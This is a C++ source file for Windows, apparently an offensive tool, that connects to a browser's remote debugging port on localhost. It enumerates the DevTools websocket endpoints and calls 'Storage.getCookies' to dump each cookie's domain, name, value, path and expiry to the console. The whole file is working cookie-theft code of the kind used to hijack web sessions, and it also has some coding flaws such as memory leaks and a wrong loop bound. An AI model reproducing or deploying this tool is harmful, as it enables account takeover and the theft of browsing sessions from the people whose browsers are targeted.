#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <cpprest/ws_client.h>
#include <cpprest/ws_msg.h>
#include <cpprest/json.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#include <sstream>

#pragma comment (lib, "wininet.lib")

using namespace web;
using namespace web::websockets::client;

// Remove special chars from the URLs
std::string cleanUrl(std::string debugUrl) {
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), '\"'), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), '}'), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), ','), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), ' '), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), '\r'), debugUrl.end());
    debugUrl.erase(std::remove(debugUrl.begin(), debugUrl.end(), '\n'), debugUrl.end());
    return debugUrl;
}

// Create a vector of the WS debugging URLs
std::vector<std::string> parseJsonEndpoint(std::string str)
{
    std::vector<std::string> debugList;
    int n = str.length();
    std::string word = "";
    for (int i = 0; i < n; i++) {
        if (str[i] == ' ' or i == (n - 1)) {
            if (word[1] == 'w' && word[2] == 's' && word[3] == ':') {

                std::string url = word + str[i];
                std::string debugUrl = cleanUrl(url);
                debugList.push_back(debugUrl);
            }
            word = "";
        }
        else {
            word += str[i];
        }
    }
    return debugList;
}

int wmain(int argc, wchar_t* argv[])
{
    if (argc < 2) {
        printf(" [!] Specify the remote debugging port!");
        return 1;
    }

    std::wstring port = argv[1];
    std::wstring loopbackUrl = L"http://localhost:" + port + L"/json";

    HINTERNET interHandle = InternetOpen(L"WS Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (interHandle == NULL)
    {
        std::cout << "[!] Failed to call InternetOpen()" << std::endl;
        return 1;
    }

    HINTERNET urlHandle = InternetOpenUrl(interHandle, (LPCWSTR)loopbackUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (urlHandle == NULL)
    {
        std::cout << "[!] Failed to connect to json endpoint: " << loopbackUrl.c_str() << std::endl;
        InternetCloseHandle(interHandle);
        return 1;
    }

    DWORD dwFileSize = 1024;
    char* buffer = new char[dwFileSize + 1];
    DWORD dwBytesRead;
    std::vector<std::string> endpointList;

    do {
        buffer = new char[dwFileSize + 1];
        ZeroMemory(buffer, sizeof(buffer));
        InternetReadFile(urlHandle, (LPVOID)buffer, dwFileSize, &dwBytesRead);
        std::string pageJson = buffer;
        endpointList = parseJsonEndpoint(pageJson);
        for (int i = 0; i < endpointList.size(); i++) {
            try {
                websocket_client client;
                client.connect(web::uri(utility::conversions::to_utf16string(endpointList.at(i).c_str()))).wait();
                std::wcout << "[+] Connected to WS server" << std::endl;

                websocket_outgoing_message msg;
                msg.set_utf8_message("{\"id\": 1, \"method\":\"Storage.getCookies\"}");
                client.send(msg).wait();

                // https://stackoverflow.com/questions/49933541/how-to-extract-specific-data-returned-from-webjsonvalueserialize-with-cp
                client.receive().then([](web::websockets::client::websocket_incoming_message msg) {
                    web::json::value response = web::json::value::parse(msg.extract_string().get());
                    web::json::value parse = response.at(U("result")).at(U("cookies"));
       
                    for (int j = 0; j < parse.serialize().size(); j++) {
                        std::wcout << "Domain: " << parse[j].at(U("domain")).serialize() << " | " << "Name: " << parse[j].at(U("name")).serialize() << " | " << "Value: " << parse[j].at(U("value")).serialize() << " | " << "Path: " << parse[j].at(U("path")).serialize() << " | " << "Expires: " << parse[j].at(U("expires")).serialize() << "\r\n" << std::endl;
                    }
                 
                }).wait();

                client.close().wait();

            } catch (const std::exception& e) {
                std::wcout << "[!] Exception: " << e.what() << std::endl;
            }
        }

    } while (dwBytesRead);

    InternetCloseHandle(interHandle);
    InternetCloseHandle(urlHandle);
}
